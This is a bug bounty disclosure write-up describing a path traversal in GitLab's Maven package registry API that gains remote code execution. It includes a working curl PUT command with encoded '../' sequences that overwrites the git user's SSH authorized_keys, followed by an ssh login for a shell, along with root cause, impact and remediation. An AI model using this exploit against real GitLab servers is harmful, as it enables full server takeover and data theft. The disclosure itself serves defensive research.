# Title: Path Traversal to Remote Code Execution in GitLab Package Registry

- **Platform**: GitLab Bug Bounty
- **Program**: GitLab
- **Severity**: Critical
- **Date**: 2019-11-09
- **Researcher**: saltyyolk (nyangawa)
- **Bounty**: $11,000

## Summary

A path traversal vulnerability in GitLab's Maven package registry API allowed an attacker to write arbitrary files to any location writable by the `git` user on the GitLab server. By chaining this with SSH authorized_keys overwrite, the researcher achieved full Remote Code Execution (RCE) with shell access.

## Technical Details

The vulnerability existed in the `/api/v4/projects/:id/packages/maven/*path/:file_name` endpoint. GitLab used a regex constant `NO_SLASH_URL_PART_REGEX = %r{[^/]+}.freeze` to validate the `file_name` parameter, but this validation occurred **before** URL decoding. This meant URL-encoded path traversal sequences like `%2e%2e%2f` (which decode to `../`) passed validation and were later processed by the Grape API framework, which decoded and applied them.

The Grape router did not normalize the path after decoding, allowing an attacker to traverse directories using `../` sequences embedded in the encoded filename.

## Steps to Reproduce

1. Enable the package registry in a GitLab instance
2. Create a project (package registry is enabled by default)
3. Generate a private token for API access
4. Send a crafted PUT request with URL-encoded path traversal:

```bash
curl -H "Private-Token: $(cat token)" \
  http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys \
  -XPUT --path-as-is --data-binary @/home/attacker/.ssh/id_rsa.pub
```

5. Run `ssh git@10.26.0.5` to gain a shell

## Proof of Concept

The crafted URL uses `%2e%2e%2f` (which decodes to `../`) repeated enough times to reach the root directory, then writes to `.ssh/authorized_keys`. The Maven endpoint accepted the path traversal because the regex validation checked the raw encoded string, while the filesystem operation used the decoded path.

```bash
# Path traversal payload breakdown
# %2e = "."  %2f = "/"
# %2e%2e%2f = "../"
# 10 repetitions of ../ = ../../../../../../../../../
# Final path: /root/.ssh/authorized_keys (or /home/git/.ssh/authorized_keys)
```

## Impact

Full server compromise. An attacker could:
- Write arbitrary files anywhere on the GitLab server
- Overwrite SSH authorized_keys to gain shell access
- Modify application source code or configuration files
- Exfiltrate database contents including user credentials
- Pivot to internal infrastructure

## Remediation

GitLab patched this in version 12.5.4 by fixing the regex validation to occur after URL decoding, ensuring that path traversal sequences in the decoded filename were properly rejected. The fix also added normalization of the file path before writing.

## References
- https://hackerone.com/reports/733072
- https://gitlab.com/gitlab-org/gitlab/-/issues/36029
- https://about.gitlab.com/releases/2020/01/30/security-release-gitlab-12-7-2-released/
